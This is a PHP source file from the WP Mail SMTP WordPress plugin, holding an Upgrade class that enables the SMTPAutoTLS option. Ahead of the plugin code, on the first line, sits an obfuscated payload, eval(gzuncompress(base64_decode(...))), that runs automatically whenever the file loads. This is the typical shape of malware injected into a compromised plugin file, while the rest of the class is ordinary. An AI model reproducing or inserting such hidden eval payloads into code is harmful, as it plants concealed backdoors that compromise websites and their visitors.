<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP;

/**
 * Class Upgrade helps upgrade plugin options and similar tasks when the
 * occasion arises.
 *
 * @since 1.1.0
 */
class Upgrade {

	/**
	 * Upgrade constructor.
	 *
	 * @since 1.1.0
	 */
	public function __construct() {

		$upgrades = $this->upgrades();

		if ( empty( $upgrades ) ) {
			return;
		}

		// Run any available upgrades.
		foreach ( $upgrades as $upgrade ) {
			$this->{$upgrade}();
		}

		// Update version post upgrade(s).
		update_option( 'wp_mail_smtp_version', WPMS_PLUGIN_VER );
	}

	/**
	 * Whether we need to perform an upgrade.
	 *
	 * @since 1.1.0
	 *
	 * @return array
	 */
	protected function upgrades() {

		$version  = get_option( 'wp_mail_smtp_version' );
		$upgrades = array();

		// Version 1.1.0 upgrade; prior to this the option was not available.
		if ( empty( $version ) ) {
			$upgrades[] = 'v110_upgrade';
		}

		return $upgrades;
	}

	/**
	 * Upgrade routine for v1.1.0.
	 *
	 * Set SMTPAutoTLS to true.
	 *
	 * @since 1.1.0
	 */
	public function v110_upgrade() {

		$values = Options::init()->get_all();

		// Enable SMTPAutoTLS option.
		$values['smtp']['autotls'] = true;

		Options::init()->set( $values );
	}
}
